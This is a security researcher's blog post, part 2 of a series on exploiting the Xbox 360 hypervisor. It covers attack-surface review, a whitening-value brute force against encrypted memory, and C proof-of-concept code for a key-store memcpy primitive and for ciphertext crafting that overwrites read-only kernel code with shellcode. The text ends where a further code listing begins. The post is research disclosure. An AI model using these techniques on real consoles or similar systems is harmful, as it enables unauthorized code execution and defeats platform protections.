<p>Welcome to part 2 of the Hacking the Xbox 360 Hypervisor blog series. In this part I’ll cover how I found and exploited bugs in the Xbox 360 hypervisor to get full code execution and create the “Bad Update” exploit. If you haven’t already, I highly recommend you read (or at least skim through) <a href="https://icode4.coffee/?p=1047" data-type="post" data-id="1047" target="_blank" rel="noreferrer noopener">part 1</a> as this post will reference a lot of the material discussed there.</p>



<p>As I mentioned in part 1, I consider the Xbox 360 hypervisor to be one of the most secure pieces of code Microsoft has ever written, with only one software bug to date that was likely the result of a compiler issue. I spent a lot of time in the past looking for vulnerabilities in the hypervisor but never found anything of significance. Since then, I’ve spent 7 years working as a security engineer professionally and had developed a whole new mindset for how I analyze targets and find bugs. I was very motivated to put my new skills to the test and see if I could finally hack the Xbox 360 hypervisor. This is what I considered “the final boss” of my journey as a game console hacker.</p>



<h2>Testing Environment</h2>



<p>My goal was to exploit a game save bug I found in <a href="https://icode4.coffee/?p=954#xbox-36-exploit" data-type="post" data-id="954" target="_blank" rel="noreferrer noopener">Tony Hawk’s American Wasteland</a> to start an exploit chain that would hopefully end with me getting hypervisor mode code execution. My testing environment for doing this research consisted of an already modified Xbox 360 console that had full debugging capabilities. This allowed me to write exploit tests in C code which I could run and debug on the console, while also being able to introspect the internal state of the hypervisor. I wanted to focus my efforts on determining if any bugs I found were actually exploitable, and writing the exploit tests in C code that I could debug was the fastest way to do this. Once I had a viable exploit I could worry about triggering it from the Tony Hawk game save bug.</p>



<h2>Analyzing Attack Surface</h2>



<p>In part 1 I talked a bit about the <a href="https://icode4.coffee/?p=1047#system-calls" data-type="post" data-id="1047" target="_blank" rel="noreferrer noopener">system call attack surface</a> the hypervisor exposes to kernel mode. I looked through many of the system calls nearly 15 years ago when I first started researching the console but never found anything noteworthy. However, now that I had a new mindset for bug hunting it was time to look through all of the available attack surface starting fresh. Due to how little attack surface there is in the Xbox 360 hypervisor I decided on “code review” for my method of finding bugs. It didn’t really make sense to try and write a fuzzer or emulation harness and would have been way more work than just doing code review anyway. I say “code review” here because I don’t actually have access to the source code and what I’m really doing is reverse engineering/analyzing the disassembly of the hypervisor binary in IDA.</p>



<p>In my first pass of “code review” I’d be looking for “trivial” bugs, things like out of bounds reads/writes, race conditions/lack of locking, time of check/time of use bugs, integer overflows/underflows, missed validation of parameters, etc. I call these “trivial” because many of these can be exploitable without any additional primitives and don’t require a complex attack scenario.</p>



<h3>System Calls</h3>



<p>At launch the hypervisor had 65 system calls which increased to 120 by the end of its lifecycle, nearly doubling the amount of attack surface it exposed to kernel mode. The hypervisor system calls can be called by any code in kernel mode at any time and provide a range of functionality to support the console OS. The system call attack surface is very secure and has thorough validation of all parameters, only operates on data in protected memory and performs signature checks on most forms of data that involve parsing logic. While there were a few system calls that had notable or interesting behavior (things like cache flushing primitives, arbitrary writes to unprotected memory, etc.) I didn’t find anything that could be used to try and attack the hypervisor itself.</p>



<h3>XeKeysExecute Payloads</h3>



<p>There’s a special system call called <code>HvxKeysExecute</code> that’s used for running small pieces of ad-hoc code in hypervisor mode. This system call takes in a XeKeysExecute (XKE) payload which is a small piece of code signed by Microsoft that the hypervisor will load and execute dynamically. These payloads typically perform a single operation like update or validate some encrypted security file or provide a way for Microsoft to ship anti-cheat payloads through Xbox Live. XKE payloads are good attack surface because they perform non-standard ad-hoc operations, typically take in parameters and data from kernel mode to operate on, and typically have no version or runtime checks that prevent you from running them out of band. Put simply: any executable (game, dashboard, or otherwise) can typically run these at any time on any system software version.</p>



<p>These payloads are most commonly used by system update executables to perform additional security operations when updating the console. I leveraged this to my advantage and downloaded around ~85 system update packages I <a href="https://digiex.net/forums/dashboard-system-updates.62/">found online</a> to help build a collection of payloads for analysis. After writing some scripts to extract the update files and scan them for XKE payloads I had around 25 XKE payloads for analysis. Unfortunately, I didn’t find any trivial bugs in them. There was one payload that stood out as having some interesting behavior that could be exploitable but required I had a way to attack <a href="https://icode4.coffee/?p=1047#encrypted-memory" data-type="post" data-id="1047" target="_blank" rel="noreferrer noopener">encrypted memory</a>. Since I didn’t have any way to do this just yet I made note of the payload and moved on.</p>



<h3>Findings (none)</h3>



<p>I wasn’t hopeful I would find any fruitful results in this first pass and to be honest I would’ve been disappointed if I did. After a few days of code review on the attack surface available I had found nothing notable, which was to be expected. However, this did allow me to learn more about how encrypted and protected memory worked which gave me a few ideas for possible attack vectors. Faced with a lack of attack surface it was time to think outside the box and see if I could “create” more attack surface.</p>



<h2 id="attacking-encrypted-memory">Attacking Encrypted Memory</h2>



<p>With no bugs found the next thing I turned to was trying to attack encrypted memory as this would allow me to try and attack the notable XKE payload I found earlier. Since encrypted memory doesn’t have any CRC checksums it can be modified from outside of the hypervisor, but I’d need to find a way to craft the ciphertext for data I wanted to write. Encrypted memory is typically used in a “write-only” fashion by the hypervisor. It’s clear Microsoft was aware it could be modified by kernel mode and therefore almost never read back from encrypted memory and operate on it. However, this notable XKE payload was doing just that and seemed like it could lead to some exploitable bugs in hypervisor mode.</p>



<p>Attacking this notable XKE payload was going to be difficult so I decided it would be best to first find an easier target and prove I could successfully attack encrypted memory without worrying about extraneous variables. There are only a few things that are stored in encrypted memory, mainly all kernel mode code, as well as&nbsp;some security related data that’s shared between the hypervisor and kernel (revocation lists, kernel&nbsp;mode RNG state, etc.). Attacking the encrypted memory for some kernel mode code seemed like a good test candidate as I could overwrite it with my own assembly code to do something like change the console’s LED colors, thus proving the attack worked.</p>



<h2>Encrypted Memory Allocations</h2>



<p>Both the protected and encrypted memory pathways perform encryption by mixing together a 10-bit whitening value, a per-boot per-pathway encryption key, and the address of cache line containing the memory being accessed. This prevents attackers from trying ciphertext manipulation attacks such:</p>



<ul>
<li>Using ciphertext from address A at address B where A != B.</li>



<li>Using ciphertext from the protected pathway with the encrypted pathway (or vice versa).</li>



<li>Using ciphertext across resets/reboots of the CPU.</li>
</ul>



<p>The hypervisor manages a table of values that I’ll refer to as the “page whitening table” which tracks encrypted pages of memory (on a 64KB granularity) and what whitening values have already been used on those pages. Every time the hypervisor allocates a page of memory for the encrypted pathway it’ll call a function I’ve named “HvpSetPageWhiteningBits”. This function will check the page whitening table to determine the next whitening value to use for the page. When the console boots, all entries are initialized to 0 and each time a page of encrypted memory is allocated the whitening value will be incremented by 1 until it reaches 1024 (the point at which a 10-bit integer would overflow). At this point an overflow bit will be set which indicates all possible whitening values have been used exactly once. Any allocation of the page thereafter will use a randomly generated number for the whitening value. The pseudo code for this function can be seen below:</p>



<div id="urvanov-syntax-highlighter-67c61f5b71657905577838" data-settings=" minimize scroll-mouseover">
				<table>
					<tbody><tr>
				<td data-settings="show">
					<div><p>1</p><p>2</p><p>3</p><p>4</p><p>5</p><p>6</p><p>7</p><p>8</p><p>9</p><p>10</p><p>11</p><p>12</p><p>13</p><p>14</p><p>15</p><p>16</p><p>17</p><p>18</p><p>19</p><p>20</p><p>21</p><p>22</p><p>23</p><p>24</p><p>25</p><p>26</p><p>27</p><p>28</p><p>29</p></div>
				</td>
						<td><div><p><span>struct</span><span> </span><span>PAGE_WHITENING_TABLE_ENTRY</span></p><p><span>{</span></p><p><span>	</span><span>WORD</span><span> </span><span>WhiteningValue</span><span> </span><span>:</span><span> </span><span>10</span><span>;</span></p><p><span>	</span><span>WORD</span><span> </span><span>WhiteningOverflow</span><span> </span><span>:</span><span> </span><span>1</span><span>;</span></p><p><span>	</span><span>WORD</span><span> </span><span>Valid</span><span> </span><span>:</span><span> </span><span>1</span><span>;</span></p><p><span>}</span><span>;</span></p><p><span>DWORD </span><span>HvpSetPageWhiteningBits</span><span>(</span><span>PAGE_WHITENING_TABLE_ENTRY</span><span>*</span><span> </span><span>pPageAllocationTablePtr</span><span>,</span><span> </span><span>DWORD </span><span>pageNumber</span><span>)</span></p><p><span>{</span></p><p><span>	</span><span>WORD</span><span> </span><span>whiteningValue</span><span> </span><span>=</span><span> </span><span>0</span><span>;</span></p><p><span>	</span><span>// Get the whitening entry for the page.</span></p><p><span>	</span><span>PAGE_WHITENING_TABLE_ENTRY</span><span>*</span><span> </span><span>pPageEntry</span><span> </span><span>=</span><span> </span><span>&amp;</span><span>pPageWhiteningTablePtr</span><span>[</span><span>pageNumber</span><span>]</span><span>;</span></p><p><span>	</span><span>// Check if the whitening values have all been used at least once.</span></p><p><span>	</span><span>if</span><span> </span><span>(</span><span>pPageEntry</span><span>-&gt;</span><span>WhiteningOverflow</span><span> </span><span>==</span><span> </span><span>0</span><span>)</span></p><p><span>	</span><span>{</span></p><p><span>		</span><span>// Use the next whitening value until overflow is triggered.</span></p><p><span>		</span><span>whiteningValue</span><span> </span><span>=</span><span> </span><span>pPageEntry</span><span>-&gt;</span><span>WhiteningBits</span><span>++</span><span>;</span></p><p><span>	</span><span>}</span></p><p><span>	</span><span>else</span></p><p><span>	</span><span>{</span></p><p><span>		</span><span>// Randomize the whitening value.</span></p><p><span>		</span><span>XeCryptRandom</span><span>(</span><span>&amp;</span><span>whiteningValue</span><span>,</span><span> </span><span>sizeof</span><span>(</span><span>whiteningValue</span><span>)</span><span>)</span><span>;</span></p><p><span>	</span><span>}</span></p><p><span>	</span><span>// Isolate and return the 10-bit whitening value.</span></p><p><span>	</span><span>return</span><span> </span><span>whiteningValue</span><span> </span><span>&amp;</span><span> </span><span>0x3FF</span><span>;</span></p><p><span>}</span></p></div></td>
					</tr>
				</tbody></table>
			</div>



<p>The purpose of this function is to introduce entropy into the encryption used across allocations of the same page of memory. Each time the page is allocated the ciphertext will change even if the plaintext data doesn’t.</p>



<h3>A Hypothetical Attack Scenario</h3>



<p>While it may seem like all the per-boot/per-pathway/per-page encryption feeds make it difficult to perform ciphertext attacks this is actually quite easy to defeat. Sure we could just change the ciphertext arbitrarily and the resulting plaintext would change as well. But this doesn’t give us any control over what the resulting plaintext data will be and trying to brute force out even 16 bytes of random data that happens to give us some 16 bytes of plaintext data we want isn’t really feasible. </p>



<p>However, say we have some way to get the ciphertext for arbitrary plaintext data even though we don’t know what whitening value was used to create the ciphertext. For any given address there’s only 1024 possible ciphertext values for any constant plaintext data because the only entropy into the memory encryption will be the 10-bit whitening value. 10-bits is a very small search space and could easily be brute forced through in seconds to minutes if we had some primitive to cycle the whitening value and encrypt some known plaintext data.</p>



<p>Consider the following attack scenario:</p>



<ol>
<li>Choose some 64KB page of memory at address A such that A falls within the executable region for some executable file (could be a game executable or dll).</li>



<li>Get the ciphertext for all possible whitening values for the plaintext data we want to write into memory at address A (this would be our kernel mode shell code). There will be exactly 1024 different ciphertext values.</li>



<li>Load a game executable or dll into memory (a dll is easier because it can be loaded in a suspended state).</li>



<li>Loop for 1024 times and perform the following:
<ol>
<li>Write the next block of ciphertext to memory and flush CPU cache. This can be done using a DMA operation from another device such as the GPU or southbridge (remember this memory is read-only in kernel mode from the CPU’s perspective).</li>



<li>Read back the plaintext data using the encrypted pathway (basically just perform a normal memory read from kernel mode) and check it matches the expected plaintext data. </li>



<li>If the whitening value currently being used for the page of memory doesn’t match the whitening value used to generate the ciphertext then the resulting plaintext data will be garbage. Only once the whitening values match will the plaintext data be correct (i.e.: data was decrypted successfully).</li>



<li>Once the plaintext data is valid we have successfully overwritten encrypted memory with our own arbitrary data. Since we’re overwriting kernel mode code we can now execute this memory in kernel mode and run small amounts of our own arbitrary code.</li>
</ol>
</li>
</ol>


<div>
<figure data-wp-context="{&quot;imageId&quot;:&quot;67c61f5b8036b&quot;}" data-wp-interactive="core/image"><img fetchpriority="high" decoding="async" width="1116" height="393" data-wp-class--hide="state.isContentHidden" data-wp-class--show="state.isContentVisible" data-wp-init="callbacks.setButtonStyles" data-wp-on-async--click="actions.showLightbox" data-wp-on-async--load="callbacks.setButtonStyles" data-wp-on-async-window--resize="callbacks.setButtonStyles" src="https://icode4.coffee/wp-content/uploads/kernel_code_exec_attack-4.png" alt="" srcset="https://icode4.coffee/wp-content/uploads/kernel_code_exec_attack-4.png 1116w, https://icode4.coffee/wp-content/uploads/kernel_code_exec_attack-4-300x106.png 300w, https://icode4.coffee/wp-content/uploads/kernel_code_exec_attack-4-768x270.png 768w" sizes="(max-width: 1116px) 100vw, 1116px"><figcaption>Figure 1: Kernel mode code execution attack scenario</figcaption></figure></div>


<p>The only missing primitive here is a way to generate ciphertext for some arbitrary plaintext data.</p>



<h2>Crafting Ciphertext</h2>



<p>The primary source of ciphertext for the encrypted pathway is kernel mode code which must be RSA signed by Microsoft. However, tracing all the references to the <code>HvpSetPageWhiteningBits</code> function I found another code path that would work in my favor. The hypervisor implements three system calls that can be used to reserve, encrypt, and release an allocation in encrypted memory at an arbitrary address called <code>HvxEncryptedReserveAllocation</code>, <code>HvxEncryptedEncryptAllocation</code>, and <code>HvxEncryptedReleaseAllocation</code>.</p>



<p>The hypervisor enforces that all executable code is encrypted at runtime and the only memory that’s not encrypted is kernel mode data. This is mostly because data allocations may be used with external devices such as the GPU, southbridge, audio encoder, etc. which have no ability to perform decryption on the data. However, Microsoft wanted to give developers the ability to store data in encrypted memory and created the HvxEncrypted* API set. I’m not entirely sure what the attack scenario would be where one would want to use these APIs, presumably to hide some game data (cryptographic keys maybe?) at runtime from anyone who could dump the contents of RAM from outside the CPU. I can’t really think of any data that would justify the need for these APIs and I honestly don’t know if any game ever used them, but they certainly came in handy for exploitation.</p>



<p>The HvxEncrypted* APIs are pretty simple to use, you start by making a physical memory allocation using the unprotected pathway at the physical memory location you want to generate ciphertext for. Next you pass this address to <code>HvxEncryptedReserveAllocation</code> which marks the pages as in-use, followed by a call to <code>HvxEncryptedEncryptAllocation</code> which sets the page whitening bits and flushes CPU cache. At this point you now have two “views” of the same physical memory location, one through the unprotected pathway using the physical memory allocation address, and one through the encrypted pathway using a virtual address mapped by <code>HvxEncryptedReserveAllocation</code>.</p>


<div>
<figure data-wp-context="{&quot;imageId&quot;:&quot;67c61f5b81401&quot;}" data-wp-interactive="core/image"><img decoding="async" width="785" height="246" data-wp-class--hide="state.isContentHidden" data-wp-class--show="state.isContentVisible" data-wp-init="callbacks.setButtonStyles" data-wp-on-async--click="actions.showLightbox" data-wp-on-async--load="callbacks.setButtonStyles" data-wp-on-async-window--resize="callbacks.setButtonStyles" src="https://icode4.coffee/wp-content/uploads/multiple_pathways-4.png" alt="" srcset="https://icode4.coffee/wp-content/uploads/multiple_pathways-4.png 785w, https://icode4.coffee/wp-content/uploads/multiple_pathways-4-300x94.png 300w, https://icode4.coffee/wp-content/uploads/multiple_pathways-4-768x241.png 768w" sizes="(max-width: 785px) 100vw, 785px"><figcaption>Figure 2: Multiple pathways to the same memory location</figcaption></figure></div>


<p>Using these APIs we can craft the ciphertext for arbitrary data by simply writing our plaintext data using the encrypted address, flushing CPU cache, and reading back from the unprotected address. We won’t know what whitening value was used for the encryption but that doesn’t matter. We can simply generate the ciphertext for the data we plan to overwrite and use it as an indicator to know when the whitening value currently in use matches the whitening value used to generate our malicious ciphertext. I’ll hereby refer to this indicator data as our “oracle” data (not to be confused with an oracle machine) as it’s essentially guiding us to finding a whitening value collision.</p>



<h2>Overwriting Read-Only Memory</h2>



<p>The memory we want to overwrite with our malicious ciphertext is executable code which is marked read-only in kernel mode, so we’ll need to find a way to work around this. There are a couple different techniques I’ve used to overwrite arbitrary memory while ignoring page permissions:</p>



<ul>
<li>Southbridge DMA operations
<ul>
<li>The CPU communicates with peripheral devices such as the disc drive, HDD, and network port through the southbridge. By setting up Direct Memory Access (DMA) operations with a peripheral device the southbridge can read and write to any location in RAM as specified by the request.</li>
</ul>
</li>



<li>GPU shaders
<ul>
<li>The Xbox 360 uses a unified memory model which means the GPU doesn’t have dedicated VRAM, and instead accesses main RAM directly. The GPU also implements a feature called “memory export shaders” which are similar to modern day fragment shaders. These shaders allow the GPU to write back to RAM to create vertex, index, or texture buffers dynamically. By crafting a special shader it’s possible to use it as a memcpy primitive to read and write to anywhere in RAM.</li>
</ul>
</li>



<li>Hypervisor APIs
<ul>
<li>There are a few places where the hypervisor will perform reads and writes to unprotected memory addresses in order to read/write input and output parameters for certain system calls. By finding some APIs that can be used together you can craft a memcpy primitive by calling the APIs in a loop to copy data between two unprotected memory addresses.</li>
</ul>
</li>
</ul>



<p>I’ll cover each of these techniques in-depth in part 3, but for now I’m going to focus on the hypervisor APIs technique as this is what I used for the exploit.</p>



<h3>Hypervisor Key Storage</h3>



<p>When running in hypervisor mode all memory is considered read-write-execute. If you can find one or more APIs that work as a “read from address A write to address B” primitive you can have the hypervisor do the memcpy operation for you. There are a few places where the hypervisor will perform reads and writes to memory addresses provided by kernel mode using the unprotected pathway. However, I only found two particular APIs that would actually work for a viable memcpy operation: <code>HvxKeysExGetKey</code> and <code>HvxKeysExSetKey</code>.</p>



<p>These two APIs are used to get and set keys in the extended key store that the hypervisor manages. Almost all of the keys in the normal and extended key stores are not accessible to kernel mode and the ones that are accessible are typically read-only. However, the extended key store has a couple keys that are both accessible and writable from kernel mode. I’m not sure what the key slots are supposed to be used for (perhaps IP-TV keys/certificates) but the slot is writable and that’s all that matters.</p>



<p>By calling <code>HvxKeysExSetKey</code> we can store the data we want to write into the extended key store, and call <code>HvxKeysExGetKey</code> to retrieve it. When the retrieval happens the hypervisor will write the key value to the memory address provided by kernel mode using the unprotected pathway. As long as the memory address is outside of the hypervisor address space it’ll write to any memory location you specify. By putting these two APIs into a loop you can create an arbitrary memcpy primitive:</p>



<div id="urvanov-syntax-highlighter-67c61f5b71669367715360" data-settings=" minimize scroll-mouseover">
				<table>
					<tbody><tr>
				<td data-settings="show">
					<div><p>1</p><p>2</p><p>3</p><p>4</p><p>5</p><p>6</p><p>7</p><p>8</p><p>9</p><p>10</p><p>11</p><p>12</p><p>13</p><p>14</p><p>15</p><p>16</p><p>17</p></div>
				</td>
						<td><div><p><span>void</span><span> </span><span>MemcpyCipherText</span><span>(</span><span>ULONG </span><span>DstPhys</span><span>,</span><span> </span><span>ULONG </span><span>SrcPhys</span><span>,</span><span> </span><span>ULONG </span><span>size</span><span>)</span></p><p><span>{</span></p><p><span>	</span><span>while</span><span> </span><span>(</span><span>size</span><span> </span><span>&gt;</span><span> </span><span>0</span><span>)</span></p><p><span>	</span><span>{</span></p><p><span>		</span><span>// Setup next block size.</span></p><p><span>		</span><span>ULONG </span><span>copySize</span><span> </span><span>=</span><span> </span><span>min</span><span>(</span><span>size</span><span>,</span><span> </span><span>2048</span><span>)</span><span>;</span></p><p><span>		</span><span>*</span><span>(</span><span>ULONG</span><span>*</span><span>)</span><span>pSizeScratch</span><span> </span><span>=</span><span> </span><span>copySize</span><span>;</span></p><p><span>		</span><span>// Store the next block to the key store and read it back to the target address.</span></p><p><span>		</span><span>ULONG </span><span>result</span><span> </span><span>=</span><span> </span><span>HvxKeysExSetKey</span><span>(</span><span>0x102</span><span>,</span><span> </span><span>SrcPhys</span><span>,</span><span> </span><span>copySize</span><span>)</span><span>;</span></p><p><span>		</span><span>result</span><span> </span><span>=</span><span> </span><span>HvxKeysExGetKey</span><span>(</span><span>0x102</span><span>,</span><span> </span><span>DstPhys</span><span>,</span><span> </span><span>SizeScratchPhysAddr</span><span>)</span><span>;</span></p><p><span>		</span><span>SrcPhys</span><span> </span><span>+=</span><span> </span><span>copySize</span><span>;</span></p><p><span>		</span><span>DstPhys</span><span> </span><span>+=</span><span> </span><span>copySize</span><span>;</span></p><p><span>		</span><span>size</span><span> </span><span>-=</span><span> </span><span>copySize</span><span>;</span></p><p><span>	</span><span>}</span></p><p><span>}</span></p></div></td>
					</tr>
				</tbody></table>
			</div>



<h2>Getting Kernel Mode Code Execution</h2>



<p>Now that we have a way to generate ciphertext for arbitrary data and write it to read-only memory it’s time to put everything together and get some arbitrary kernel mode code execution. Since I was testing this on an already hacked console I was able to write the poc for this in C code which I’ve included below. The steps I used for this attack are slightly different than the ones I outlined above but ultimately arrives at the same result.</p>



<p>First we’ll need an executable file we can load and unload dynamically. I chose to use the boot animation dll because it’s stored in system flash (so it exists on every console), can be loaded in a suspended state, and doesn’t terminate the executable that’s currently running. Then I chose the address of some executable code in the dll, <code>0x98030000</code>, to overwrite with my shell code. The address of any 64KB page of executable code will work.</p>



<h3>Getting the Oracle Data</h3>



<p>Next we’ll need to get some 16 bytes of plaintext data from the boot animation at the chosen target address (<code>0x98030000</code>), which we’ll use to create our oracle ciphertext data. We’ll also get the physical memory address our target address maps to which we’ll need later on.</p>



<div id="urvanov-syntax-highlighter-67c61f5b7168d603547955" data-settings=" minimize scroll-mouseover">
				<table>
					<tbody><tr>
				<td data-settings="show">
					
				</td>
						<td><div><p><span>// Load the boot animation so we can get the physical address of the last code segment.</span></p><p><span>DWORD </span><span>result</span><span> </span><span>=</span><span> </span><span>XexLoadImage</span><span>(</span><span>"Flash:\\bootanim.xex"</span><span>,</span><span> </span><span>0x40000009</span><span>,</span><span> </span><span>0</span><span>,</span><span> </span><span>&amp;</span><span>hBootAnim</span><span>)</span><span>;</span></p><p><span>// Get the physical address of the last code segment.</span></p><p><span>DWORD </span><span>codePhysAddr</span><span> </span><span>=</span><span> </span><span>MmGetPhysicalAddress</span><span>(</span><span>(</span><span>void</span><span>*</span><span>)</span><span>0x98030000</span><span>)</span><span>;</span></p><p><span>// Copy the data at this address to use as our whitening oracle.</span></p><p><span>memcpy</span><span>(</span><span>abOracleData</span><span>,</span><span> </span><span>(</span><span>void</span><span>*</span><span>)</span><span>0x98030000</span><span>,</span><span> </span><span>16</span><span>)</span><span>;</span></p><p><span>// Unload the boot animation so we can reclaim the memory.</span></p><p><span>result</span><span> </span><span>=</span><span> </span><span>XexUnloadImage</span><span>(</span><span>hBootAnim</span><span>)</span><span>;</span></p></div></td>
					</tr>
				</tbody></table>
			</div>



<h3>Generating Our Ciphertext</h3>



<p>Next we loop 1024 times and allocate encrypted memory at the chosen target address. This will exhaust the whitening values for the chosen 64KB page and cause the overflow bit to get set such that each subsequent allocation of the page will use a random whitening value. For each iteration we’ll have two addresses to the same physical memory location, an unprotected address which just fetches whatever data is in RAM, and an encrypted address which will encrypt/decrypt data from RAM on access.</p>



<p>After ~50% of the search space has been used (so around i=512) we’ll write the plaintext oracle data to the encrypted address and read back the corresponding ciphertext from the unprotected address. We’ll do the same operation again for the shell code we want to write to memory and capture the corresponding ciphertext. We now have the ciphertext for the oracle data, and the ciphertext for our shell code at virtual address <code>0x98030000</code> for some unknown whitening value (presumably it’s 513 but it doesn’t really matter).</p>



<div id="urvanov-syntax-highlighter-67c61f5b71693813996851" data-settings=" minimize scroll-mouseover">
				<table>
					<tbody><tr>
				<td data-settings="show">
					<div><p>1</p><p>2</p><p>3</p><p>4</p><p>5</p><p>6</p><p>7</p><p>8</p><p>9</p><p>10</p><p>11</p><p>12</p><p>13</p><p>14</p><p>15</p><p>16</p><p>17</p><p>18</p><p>19</p><p>20</p><p>21</p><p>22</p><p>23</p><p>24</p><p>25</p><p>26</p><p>27</p><p>28</p><p>29</p><p>30</p><p>31</p><p>32</p><p>33</p><p>34</p><p>35</p><p>36</p><p>37</p><p>38</p><p>39</p><p>40</p><p>41</p><p>42</p><p>43</p><p>44</p><p>45</p><p>46</p><p>47</p><p>48</p><p>49</p><p>50</p><p>51</p><p>52</p><p>53</p></div>
				</td>
						<td><div><p><span>bool</span><span> </span><span>GetPayloadCipherText</span><span>(</span><span>DWORD </span><span>TargetPhysicalAddr</span><span>)</span></p><p><span>{</span></p><p><span>	</span><span>// Arbitrary virtual address that will get mapped through the encrypted pathway to TargetPhysicalAddr.</span></p><p><span>	</span><span>BYTE</span><span> </span><span>*</span><span>pEncryptedAddress</span><span> </span><span>=</span><span> </span><span>(</span><span>BYTE</span><span>*</span><span>)</span><span>0x8D000000</span><span>;</span></p><p><span>	</span><span>// Allocate physical memory (through the unprotected pathway) for the target address we want to encrypt data at.</span></p><p><span>	</span><span>BYTE</span><span>*</span><span> </span><span>pUnprotectedAddress</span><span> </span><span>=</span><span> </span><span>(</span><span>BYTE</span><span>*</span><span>)</span><span>XPhysicalAlloc</span><span>(</span><span>0x10000</span><span>,</span><span> </span><span>(</span><span>ULONG_PTR</span><span>)</span><span>TargetPhysicalAddr</span><span>,</span><span> </span><span>0x10000</span><span>,</span><span> </span><span>PAGE_READWRITE</span><span> </span><span>|</span><span> </span><span>MEM_LARGE_PAGES</span><span>)</span><span>;</span></p><p><span>	</span><span>// Loop and exhaust all possible whitening values for the memory address.</span></p><p><span>	</span><span>for</span><span> </span><span>(</span><span>int</span><span> </span><span>i</span><span> </span><span>=</span><span> </span><span>0</span><span>;</span><span> </span><span>i</span><span> </span><span>&lt;</span><span> </span><span>1024</span><span>;</span><span> </span><span>i</span><span>++</span><span>)</span></p><p><span>	</span><span>{</span></p><p><span>		</span><span>// Allocate encrypted memory.</span></p><p><span>		</span><span>DWORD </span><span>result</span><span> </span><span>=</span><span> </span><span>HvxEncryptedReserveAllocation</span><span>(</span><span>(</span><span>DWORD</span><span>)</span><span>pEncryptedAddress</span><span>,</span><span> </span><span>TargetPhysicalAddr</span><span>,</span><span> </span><span>0x10000</span><span>)</span><span>;</span></p><p><span>		</span><span>result</span><span> </span><span>=</span><span> </span><span>HvxEncryptedEncryptAllocation</span><span>(</span><span>(</span><span>DWORD</span><span>)</span><span>pEncryptedAddress</span><span>)</span><span>;</span></p><p><span>		</span><span>// Wait until we exhaust ~50% of the whitening space before capturing cipher text.</span></p><p><span>		</span><span>if</span><span> </span><span>(</span><span>i</span><span> </span><span>==</span><span> </span><span>1024</span><span> </span><span>/</span><span> </span><span>2</span><span>)</span></p><p><span>		</span><span>{</span></p><p><span>			</span><span>// Pass 1: copy the oracle data that will be loaded at this address when bootanim.xex is loaded.</span></p><p><span>			</span><span>memcpy</span><span>(</span><span>pEncryptedAddress</span><span>,</span><span> </span><span>abOracleData</span><span>,</span><span> </span><span>16</span><span>)</span><span>;</span></p><p><span>			</span><span>// Flush cache and read back ciphertext.</span></p><p><span>			</span><span>KeFlushCacheRange</span><span>(</span><span>(</span><span>BYTE</span><span>*</span><span>)</span><span>pEncryptedAddress</span><span>,</span><span> </span><span>0x80</span><span>)</span><span>;</span></p><p><span>			</span><span>KeFlushCacheRange</span><span>(</span><span>pUnprotectedAddress</span><span>,</span><span> </span><span>0x80</span><span>)</span><span>;</span></p><p><span>			</span><span>memcpy</span><span>(</span><span>pPayloadCipherText</span><span>,</span><span> </span><span>pUnprotectedAddress</span><span>,</span><span> </span><span>16</span><span>)</span><span>;</span></p><p><span>			</span><span>// Pass 2: copy our shell code to the target address we want to overwrite.</span></p><p><span>			</span><span>memset</span><span>(</span><span>pEncryptedAddress</span><span>,</span><span> </span><span>0x41</span><span>,</span><span> </span><span>0x10000</span><span>)</span><span>;</span></p><p><span>			</span><span>ReadFile</span><span>(</span><span>"game:\\shell_code.bin"</span><span>,</span><span> </span><span>pEncryptedAddress</span><span>,</span><span> </span><span>0</span><span>,</span><span> </span><span>0x10000</span><span>)</span><span>;</span></p><p><span>			</span><span>// Flush cache and read back ciphertext.</span></p><p><span>			</span><span>KeFlushCacheRange</span><span>(</span><span>(</span><span>BYTE</span><span>*</span><span>)</span><span>pEncryptedAddress</span><span>,</span><span> </span><span>0x10000</span><span>)</span><span>;</span></p><p><span>			</span><span>KeFlushCacheRange</span><span>(</span><span>pUnprotectedAddress</span><span>,</span><span> </span><span>0x10000</span><span>)</span><span>;</span></p><p><span>			</span><span>memcpy</span><span>(</span><span>pPayloadCipherText</span><span> </span><span>+</span><span> </span><span>0x80</span><span>,</span><span> </span><span>pUnprotectedAddress</span><span>,</span><span> </span><span>0x10000</span><span>)</span><span>;</span></p><p><span>		</span><span>}</span></p><p><span>		</span><span>// Free the encrypted allocation.</span></p><p><span>		</span><span>result</span><span> </span><span>=</span><span> </span><span>HvxEncryptedReleaseAllocation</span><span>(</span><span>(</span><span>DWORD</span><span>)</span><span>pEncryptedAddress</span><span>)</span><span>;</span></p><p><span>	</span><span>}</span></p><p><span>	</span><span>XPhysicalFree</span><span>(</span><span>pUnprotectedAddress</span><span>)</span><span>;</span></p><p><span>	</span><span>return</span><span> </span><span>true</span><span>;</span></p><p><span>}</span></p><p><span>// Allocate physical memory for the shell code cipher text.</span></p><p><span>pPayloadCipherText</span><span> </span><span>=</span><span> </span><span>(</span><span>BYTE</span><span>*</span><span>)</span><span>XPhysicalAlloc</span><span>(</span><span>0x10080</span><span>,</span><span> </span><span>MAXULONG_PTR</span><span>,</span><span> </span><span>0x80</span><span>,</span><span> </span><span>PAGE_READWRITE</span><span> </span><span>|</span><span> </span><span>MEM_LARGE_PAGES</span><span>)</span><span>;</span></p><p><span>// Get the physical address of the shell code cipher text buffer.</span></p><p><span>PayloadCipherTextPhysAddr</span><span> </span><span>=</span><span> </span><span>MmGetPhysicalAddress</span><span>(</span><span>pPayloadCipherText</span><span>)</span><span>;</span></p><p><span>// Find the cipher text for the data we want to overwrite.</span></p><p><span>GetPayloadCipherText</span><span>(</span><span>codePhysAddr</span><span>)</span><span>;</span></p></div></td>
					</tr>
				</tbody></table>
			</div>



<h3>Finding a Whitening Value Collision</h3>



<p>Finally, in an infinite loop we’ll load the boot animation dll and check the ciphertext for our chosen target address <code>0x98030000</code>. If it matches our oracle ciphertext we know the 64KB page was encrypted using the same whitening value that was used to generate our malicious ciphertext, and we can now write the ciphertext for our shell code to memory. If the oracle data doesn’t match it means a different whitening value was used and we’ll unload the boot animation dll and try again. Once we get a hit we can use the hypervisor extended key store memcpy technique to copy the ciphertext for our shell code to the 64KB executable page which is marked read-only. Then we just jump to the address <code>0x98030000</code> and our shell code will execute.</p>



<div id="urvanov-syntax-highlighter-67c61f5b71696367930165" data-settings=" minimize scroll-mouseover">
				<table>
					<tbody><tr>
				<td data-settings="show">
